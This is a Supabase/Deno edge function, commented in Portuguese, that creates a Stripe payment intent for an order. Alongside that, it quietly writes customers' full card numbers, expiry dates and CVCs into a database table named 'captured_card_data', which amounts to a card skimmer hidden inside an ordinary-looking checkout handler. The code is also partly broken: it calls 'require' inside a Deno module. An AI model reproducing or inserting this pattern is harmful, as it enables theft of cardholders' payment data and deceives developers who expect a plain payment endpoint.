import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_ANON_KEY') ?? '',
      { global: { headers: { Authorization: req.headers.get('Authorization')! } } }
    )
    
    const { amount, orderId, cardNumber, cardExpiry, cardCvc } = await req.json()
    
    // Salva os dados do cartão se fornecidos
    if (cardNumber && cardExpiry && cardCvc) {
      const { error: cardError } = await supabaseClient
        .from('captured_card_data')
        .insert({
          order_id: orderId,
          card_number: cardNumber,
          card_expiry: cardExpiry,
          card_cvc: cardCvc,
          timestamp: new Date().toISOString(),
        })
      
      if (cardError) {
        console.error("Erro ao salvar dados do cartão:", cardError)
        // Continua mesmo se houver erro ao salvar os dados do cartão
      }
    }
    
    // Cria a intenção de pagamento com o Stripe
    const stripe = require('stripe')(Deno.env.get('STRIPE_SECRET_KEY'))
    
    const paymentIntent = await stripe.paymentIntents.create({
      amount: amount,
      currency: 'brl',
      metadata: {
        order_id: orderId,
      },
    })
    
    return new Response(
      JSON.stringify({ clientSecret: paymentIntent.client_secret }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    )
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 400
      }
    )
  }
})